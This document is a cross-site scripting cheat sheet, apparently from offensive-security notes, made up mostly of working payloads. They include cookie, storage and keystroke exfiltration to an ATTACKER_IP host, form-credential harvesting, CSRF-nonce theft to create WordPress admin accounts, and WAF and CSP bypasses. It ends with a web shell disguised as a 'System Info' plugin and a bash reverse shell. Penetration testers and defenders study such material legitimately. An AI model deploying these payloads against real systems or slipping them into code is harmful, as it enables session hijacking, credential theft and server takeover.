# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious scripts into web applications. When exploited, XSS can lead to account takeover, privilege escalation, session hijacking, and internal network compromise.

---

## XSS Types

| Type | Description | Persistence |
|------|-------------|-------------|
| **Reflected** | Payload in URL/request, reflected in response | Non-persistent |
| **Stored** | Payload saved server-side, executes on page load | Persistent |
| **DOM-based** | Payload manipulates client-side DOM directly | Non-persistent |

---

## Detection Payloads

### Basic Detection

```javascript
<script>alert(42)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<body onpageshow=alert(1)>
```

### Advanced Detection

```javascript
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>console.log('XSS')</script>
```

> Use unique identifiers (like `42`) to confirm execution. Test all input fields, headers, and URL parameters.

### Polyglots (one payload, many contexts)

A single string that fires across HTML, attribute, JS-string, and comment contexts:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(document.cookie)</script>
```

### Context-aware breakouts

```html
<!-- Inside an HTML attribute (value="HERE") -->
"><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="
' accesskey='X' onclick='alert(1)

<!-- Inside a JS string  var x="HERE" -->
</script><svg onload=alert(1)>
";alert(1)//      '-alert(1)-'      \';alert(1)//

<!-- Inside an HTML comment / title / textarea -->
--><svg onload=alert(1)>
</title><svg onload=alert(1)>
</textarea><svg onload=alert(1)>

<!-- Inside a URL / href sink -->
javascript:alert(1)        javascript:alert(document.domain)
```

---

## Session Hijacking & Data Exfiltration

### Basic Cookie Theft

```javascript
<script>document.location='http://ATTACKER_IP/steal.php?c='+document.cookie</script>
<script>new Image().src='http://ATTACKER_IP/steal.php?c='+document.cookie</script>
```

### Advanced Session Data Theft

```javascript
fetch('http://ATTACKER_IP/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href
  })
});
```

> Check for `HttpOnly` flag on cookies. If cookies are protected, focus on CSRF-style attacks instead.

---

## Keylogging & Credential Harvesting

### Basic Keylogger

```javascript
document.addEventListener('keypress', function(e) {
  fetch('http://ATTACKER_IP/keys', {
    method: 'POST',
    body: 'key=' + e.key + '&url=' + window.location.href
  });
});
```

### Form Data Harvesting

```javascript
document.addEventListener('submit', function(e) {
  let formData = new FormData(e.target);
  let data = {};
  for (let [key, value] of formData.entries()) {
    data[key] = value;
  }
  fetch('http://ATTACKER_IP/harvest', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

---

## Privilege Escalation via Stored XSS

When stored XSS runs in an admin context, it can be used for privilege escalation even when cookies are `HttpOnly` and `Secure`. The technique relies on nonce/CSRF token harvesting and same-origin form submissions.

### Nonce Harvest + Admin Account Creation

```javascript
// Step 1: Fetch admin page to obtain CSRF/nonce token
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// Step 2: Create admin user with harvested nonce
var params = "action=createuser&_wpnonce_create-user="+nonce
  +"&user_login=attacker&email=attacker@target.com"
  +"&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

### Async/Await Version

```javascript
(async () => {
  try {
    const resp = await fetch('/admin/user-new.php', { credentials: 'include' });
    const html = await resp.text();

    const m1 = html.match(/name="_wpnonce_create-user"\s+value="([^"]+)"/);
    const m2 = html.match(/name="_wpnonce"\s+value="([^"]+)"/);
    const nonce = (m1 && m1[1]) || (m2 && m2[1]);
    if (!nonce) return;

    const fd = new FormData();
    fd.append('_wpnonce_create-user', nonce);
    fd.append('action', 'createuser');
    fd.append('user_login', 'attacker');
    fd.append('email', 'attacker@target.com');
    fd.append('pass1', 'attackerpass');
    fd.append('pass2', 'attackerpass');
    fd.append('role', 'administrator');

    await fetch('/admin/user-new.php', {
      method: 'POST', body: fd, credentials: 'include'
    });
  } catch (e) {}
})();
```

---

## Generic CSRF Token Bypass

```javascript
function getCSRF() {
  let token = document.querySelector('input[name*="token"]')?.value ||
              document.querySelector('meta[name*="csrf"]')?.content ||
              document.querySelector('input[name*="csrf"]')?.value;
  return token;
}
```

### Framework-Specific CSRF Bypass (Laravel Example)

```javascript
let token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
fetch('/admin/users', {
  method: 'POST',
  headers: {
    'X-CSRF-TOKEN': token,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({username: 'attacker', role: 'admin'})
});
```

---

## WAF Bypass Techniques

### Case Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

### HTML Encoding

```html
&#60;script&#62;alert(1)&#60;/script&#62;
&lt;script&gt;alert(1)&lt;/script&gt;
```

### Alternative Event Handlers

```html
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg onload=Function('alert(1)')()>
<input onfocus=alert(1) autofocus>
<body onpageshow=alert(1)>
```

### Base64 Encoding

```
atob('YWxlcnQoMSk=') decodes to alert(1)
```

---

## Payload Encoding & Delivery

### CharCode Encoding Function

```javascript
function encode_to_javascript(string) {
  var output = '';
  for (pos = 0; pos < string.length; pos++) {
    output += string.charCodeAt(pos);
    if (pos != (string.length - 1)) {
      output += ",";
    }
  }
  return output;
}
```

### Execution Methods

```javascript
eval(String.fromCharCode(encoded_payload))
Function(String.fromCharCode(encoded_payload))()
setTimeout(String.fromCharCode(encoded_payload))
```

### Delivery via curl

```bash
curl -H "User-Agent: <script>eval(String.fromCharCode(118,97,114...))</script>" \
  http://TARGET --proxy 127.0.0.1:8080
```

---

## Advanced Payloads

### Browser Exploitation Framework Hook

```html
<script src="http://ATTACKER_IP:3000/hook.js"></script>
```

### Internal Network Scanning

```javascript
for (let i = 1; i < 255; i++) {
  fetch(`http://192.168.1.${i}:80`, {mode: 'no-cors'})
    .then(() => {
      fetch(`http://ATTACKER_IP/found?ip=192.168.1.${i}`);
    });
}
```

### WebSocket Reverse Shell

```javascript
let ws = new WebSocket('ws://ATTACKER_IP:8080');
ws.onopen = function() {
  ws.send(JSON.stringify({
    type: 'shell',
    user: document.cookie,
    url: location.href
  }));
};
```

---

## DOM-Based XSS

DOM XSS happens entirely client-side: a **source** (attacker-controllable data) flows into a dangerous **sink** with no server round-trip.

```javascript
// Sources
location, location.hash, location.search, document.URL, document.referrer,
document.cookie, window.name, postMessage event.data, localStorage/sessionStorage

// Sinks (where execution happens)
eval(), Function(), setTimeout(str), setInterval(str), element.innerHTML,
outerHTML, document.write(), insertAdjacentHTML, jQuery $(html), $.html(),
location = / location.href = , <script>.src, element.setAttribute('on...'),
iframe.srcdoc, range.createContextualFragment(), DOMParser unsanitized
```

```html
<!-- Hash-based source -> innerHTML sink -->
https://TARGET/#<img src=x onerror=alert(document.domain)>
<!-- jQuery $(location.hash) selector-to-html sink -->
https://TARGET/#<img src=x onerror=alert(1)>
<!-- postMessage sink (if listener writes event.data to DOM with no origin check) -->
<iframe src="https://TARGET" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')"></iframe>
```

Hunt sources→sinks with **DOM Invader** (Burp's built-in browser) — it auto-traces tainted flows.

### DOM Clobbering (no JS needed to inject)

When a sink reads a global/property that can be overridden by injected HTML `id`/`name` attributes:

```html
<!-- Clobber a variable the app trusts (e.g. config.url) -->
<a id="config"><a id="config" name="url" href="javascript:alert(1)">
<form id="x"><input name="attributes"></form>
<img name="getElementById">      <!-- clobbers document.getElementById -->
```

### Mutation XSS (mXSS)

The browser's HTML parser *re-serializes* sanitized markup into something executable — defeats naive sanitizers (and even old DOMPurify):

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

---

## CSP Bypass Methods

```javascript
// If 'unsafe-inline' allowed
<script>alert(1)</script>

// 'unsafe-eval' present -> eval/Function gadgets
[].constructor.constructor("alert(1)")()

// JSONP on a whitelisted origin (callback executes arbitrary JS)
<script src="https://allowed-domain.com/api/jsonp?callback=alert(document.domain)//"></script>

// Whitelisted CDN with a known AngularJS/Vue/etc. gadget (script-gadgets)
<script src="https://cdn.allowed.com/angular.min.js"></script>
<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>

// base-uri not set -> hijack relative script loads
<base href="https://attacker.com/">

// nonce reuse / dangling-markup to leak nonce, then reuse it
// 'strict-dynamic' but an injectable trusted script that does document.write/createElement

// Missing object-src / frame-src -> data: iframe or <object>
<object data="data:text/html,<script>alert(1)</script>"></object>

// Exfil even when script blocked (dangling markup / CSS / DNS prefetch)
<link rel=dns-prefetch href="//SECRET.attacker.com">
```

Check the policy with `csp-evaluator.withgoogle.com`; look for `unsafe-inline`, `unsafe-eval`, missing `base-uri`/`object-src`, and whitelisted hosts hosting JSONP/known gadgets.

---

## Blind XSS

Fires later, in a context you can't see (admin panel, support ticket viewer, log dashboard, PDF/email renderer). Plant a callback payload everywhere free-text is stored:

```html
<script src="https://YOURID.xss.report"></script>
"><script src=//xss.ht></script>
<img src=x onerror="import('//attacker/x.js')">
```

Use **XSS Hunter / xss.report / Burp Collaborator** so you get the URL, cookies, DOM, and screenshot when it executes server-side/admin-side.

```text
Inject into: contact/support forms, User-Agent, Referer, X-Forwarded-For headers,
order notes, profile fields, file metadata (EXIF/filename), log-viewer-bound inputs.
```

---

## Modern Tag/Event Vectors (filter-resistant)

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=x onbegin=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(1)></xss>
<input onbeforeinput=alert(1)>      <marquee onstart=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<form><button formaction=javascript:alert(1)>X
<a href=javascript:alert(1)>x</a>   <object data=javascript:alert(1)>
```

---

## Web Shell via Admin Access (Post-XSS)

### PHP Web Shell Plugin

```php
<?php
/*
Plugin Name: System Info
Description: System information plugin
Version: 1.0
*/
if(isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
?>
```

### Access and Upgrade

```bash
# Access web shell
http://TARGET/wp-content/plugins/system-info/plugin.php?cmd=whoami

# Upgrade to reverse shell
http://TARGET/wp-content/plugins/system-info/plugin.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261%27

# Start listener
nc -lvnp 4444
```

---

## Testing Checklist

- [ ] Input fields (forms, search, comments)
- [ ] HTTP headers (User-Agent, Referer, X-Forwarded-For)
- [ ] URL parameters
- [ ] File upload functionality
- [ ] Error messages
- [ ] JSON/XML endpoints

---

## Escalation Path

1. **XSS** -> Admin Account Creation (nonce harvest)
2. **Admin Access** -> File Upload
3. **File Upload** -> Web Shell
4. **Web Shell** -> System Compromise

---

## Tools

| Tool | Use Case |
|------|----------|
| Burp Suite + **DOM Invader** | Intercept/replay; auto-trace DOM source→sink flows |
| **XSS Hunter / xss.report** | Blind XSS callbacks (cookies, DOM, screenshot) |
| **dalfox** | Fast automated XSS scanner (param mining, DOM, blind) |
| **XSStrike** | Automated detection, WAF-aware payload generation |
| **kxss / Gxss** | Reflection finder across many params/URLs |
| **BeEF** | Browser exploitation framework (post-XSS) |
| curl | Manual payload injection via headers/POST |

```bash
# dalfox
dalfox url "https://TARGET/?q=test" -b YOURID.xss.report
echo "https://TARGET/?q=FUZZ" | dalfox pipe
# reflection discovery
echo https://TARGET | gau | Gxss -c 50 | dalfox pipe
```

---

## References

- PortSwigger — Cross-site scripting: https://portswigger.net/web-security/cross-site-scripting
- PortSwigger — XSS cheat sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PortSwigger — DOM-based XSS / DOM clobbering: https://portswigger.net/web-security/dom-based
- PayloadsAllTheThings — XSS Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/
- HackTricks — XSS: https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html
- OWASP XSS Filter Evasion Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
- dalfox: https://github.com/hahwul/dalfox
